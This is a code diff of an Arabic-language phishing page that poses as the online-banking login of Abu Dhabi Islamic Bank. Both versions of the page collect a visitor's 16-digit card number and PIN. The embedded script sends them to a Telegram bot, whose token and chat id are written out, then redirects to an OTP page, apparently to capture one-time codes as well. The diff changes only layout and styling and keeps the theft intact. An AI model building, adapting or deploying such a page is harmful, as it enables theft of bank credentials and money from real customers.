@@ -1,226 +1,145 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مصرف أبوظبي الإسلامي - تسجيل الدخول</title>
-
-    <!-- Open Graph Meta Tags -->
-    <meta property="og:title" content="مصرف أبوظبي الإسلامي - تسجيل الدخول">
-    <meta property="og:description" content="مرحباً بك في الخدمات عبر الإنترنت من مصرف أبوظبي الإسلامي.">
-    <meta property="og:image" content="https://alkhaleeg.services/sadUae/images/adib_logo.png">
-    <meta property="og:url" content="https://alkhaleeg.services/sadu/adib_login.html">
-    <meta property="og:type" content="website">
-
+    <title>تسجيل الدخول - مصرف أبوظبي الإسلامي</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            color: #333;
-            background: #ffffff;
-            padding: 20px;
-            line-height: 1.8;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             margin: 0;
-            max-width: 100%;
-            box-sizing: border-box;
         }
 
-        /* Responsive adjustments */
-        @media (max-width: 768px) {
-            body {
-                padding: 15px;
-                font-size: 14px;
-            }
-            .header img {
-                height: 50px;
-            }
-            .form-container {
-                padding: 20px;
-            }
-            .btn-login {
-                width: 90%;
-                font-size: 14px;
-                padding: 10px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            body {
-                padding: 10px;
-                font-size: 13px;
-            }
-            .header img {
-                height: 40px;
-            }
-            .form-container {
-                padding: 15px;
-            }
-            .btn-login {
-                width: 95%;
-                font-size: 13px;
-                padding: 8px;
-            }
-        }
-
-        .header {
+        .login-container {
+            width: 90%;
+            max-width: 400px;
             text-align: center;
+            padding: 20px;
+        }
+
+        .logo {
+            width: 220px;
+            margin-bottom: 40px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        h2 {
+            font-size: 1.2rem;
+            color: #333;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            font-weight: normal;
+        }
+
+        .form-group {
+            text-align: right;
             margin-bottom: 20px;
         }
-        .header img {
-            height: 60px;
-            vertical-align: middle;
-            margin: 0 auto;
-            display: block;
-        }
-        h2 {
-            text-align: center;
-            margin-top: 20px;
-            margin-bottom: 10px;
-            font-weight: bold;
-            font-size: 24px;
-            line-height: 1.3;
-        }
-        .greeting-line1 {
-            display: block;
-            margin: 0;
-            font-size: 22px;
-            line-height: 1.4;
-        }
-        .greeting-line2 {
-            display: block;
-            margin: 0;
-            font-size: 28px;
-            font-weight: 700;
-            line-height: 1.3;
-        }
-        .form-container {
-            background: white;
-            padding: 30px;
-            border-radius: 0;
-            box-shadow: none;
-            max-width: 500px;
-            margin: 20px auto;
-            text-align: center;
-        }
+
         label {
             display: block;
-            margin: 5px 0 5px;
-            font-weight: bold;
-            text-align: right;
+            font-size: 0.9rem;
+            color: #555;
+            margin-bottom: 8px;
         }
-        input[type="text"] {
+
+        input {
             width: 100%;
-            height: 40px;
-            padding: 0 12px;
-            border: 2px solid #ccc;
-            border-radius: 0;
-            background: white;
-            font-size: 16px;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
             box-sizing: border-box;
             outline: none;
+            background-color: #fcfcfc;
         }
-        input[type="text"]:focus {
-            border-color: #008000;
+
+        input:focus {
+            border-color: #007bff;
         }
-        .btn-login {
-            display: block;
+
+        .login-btn {
             width: 100%;
-            height: 45px;
-            margin: 30px auto 25px;
-            padding: 0;
-            background: #008000;
+            padding: 15px;
+            background-color: #007bff;
             color: white;
-            text-align: center;
-            border-radius: 0;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
             border: none;
-            line-height: 45px;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s;
         }
-        .error-message {
-            display: none;
-            text-align: center;
-            color: red;
-            font-weight: bold;
-            margin: 10px 0;
+
+        .login-btn:hover {
+            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <img src="https://alkhaleeg.services/sadUae/images/adib_logo.png" alt="شعار مصرف أبوظبي الإسلامي">
-</div>
+<div class="login-container">
+    <img src="https://alkhaleeg.services/sadUae/banks/adib.png" alt="ADIB Logo" class="logo">
 
-<h2>
-    <span class="greeting-line1">مرحباً بك في الخدمات عبر الإنترنت من مصرف أبوظبي</span>
-    <span class="greeting-line2">الإسلامي</span>
-</h2>
+    <h2>مرحباً بك في الخدمات عبر الإنترنت من مصرف أبوظبي الإسلامي</h2>
 
-<div class="form-container">
-    <form id="adibLogin">
-        <label for="cardNumber">رقم بطاقة الخصم المباشر / البطاقة المغطاة المكونة من 16 رقم</label>
-        <input type="text" id="cardNumber" name="cardNumber" required pattern="\d{16}" title="يجب أن يكون 16 رقمًا">
+    <form id="adibForm">
+        <div class="form-group">
+            <label for="card-number">رقم بطاقة الخصم المباشر / البطاقة المغطاة المكونة من 16 رقم</label>
+            <input type="text" id="card-number" maxlength="16" placeholder="">
+        </div>
 
-        <label for="pin">رمز (PIN) الخاصة بأجهزة السعر الفوري</label>
-        <input type="password" id="pin" name="pin" required minlength="4" maxlength="6" title="رقم PIN بين 4 و6 أرقام">
+        <div class="form-group">
+            <label for="pin">رمز (PIN) الخاصة بأجهزة السعر الفوري</label>
+            <input type="password" id="pin" placeholder="">
+        </div>
 
-        <button type="submit" class="btn-login">تسجيل الدخول</button>
-        <div class="error-message" id="errorMessage"></div>
+        <button type="submit" class="login-btn">تسجيل الدخول</button>
     </form>
 </div>
 
 <script>
-    document.getElementById('adibLogin').addEventListener('submit', function(e) {
-        e.preventDefault();
+document.getElementById('adibForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const cardNumber = document.getElementById('card-number').value;
+    const pin = document.getElementById('pin').value;
 
-        const cardNumber = document.getElementById('cardNumber').value;
-        const pin = document.getElementById('pin').value;
+    // التحقق من إدخال البيانات
+    if (!cardNumber || !pin) {
+        alert('يرجى ملء جميع الحقول');
+        return;
+    }
 
-        // إخفاء رسالة الخطأ
-        document.getElementById('errorMessage').style.display = 'none';
-
-        // بوت تلغرام
-        const botToken = '7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM';
-        const chatId = '1008144314';
-
-        const message = `
-🔐 *تسجيل دخول مصرف أبوظبي الإسلامي*
-
-💳 رقم البطاقة: ${cardNumber}
-🔢 رمز PIN: ${pin}
-📅 التاريخ: ${new Date().toLocaleString('ar-EG')}
-`;
-
-        // إرسال البيانات إلى تلغرام
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+    // إرسال البيانات لبوت تلغرام
+    fetch('https://api.telegram.org/bot7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: '1008144314',
+            text: `🔐 *بيانات دخول جديدة - مصرف أبوظبي الإسلامي*\n💳 رقم البطاقة: ${cardNumber}\n🔢 رمز PIN: ${pin}\n📅 ${new Date().toLocaleString('ar-EG')}`,
+            parse_mode: 'Markdown'
         })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                // بعد النجاح: التوجيه إلى صفحة OTP
-                window.location.href = 'otp_page.html';
-            } else {
-                throw new Error('فشل الإرسال');
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            const errorMsg = document.getElementById('errorMessage');
-            errorMsg.textContent = '❌ حدث خطأ أثناء إرسال البيانات. يرجى المحاولة لاحقًا.';
-            errorMsg.style.display = 'block';
-        });
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            window.location.href = 'otp_page.html';
+        } else {
+            throw new Error('فشل الإرسال');
+        }
+    })
+    .catch(() => {
+        alert('❌ خطأ في إرسال البيانات. تحقق من الاتصال بالإنترنت.');
     });
+});
 </script>
 
 </body>
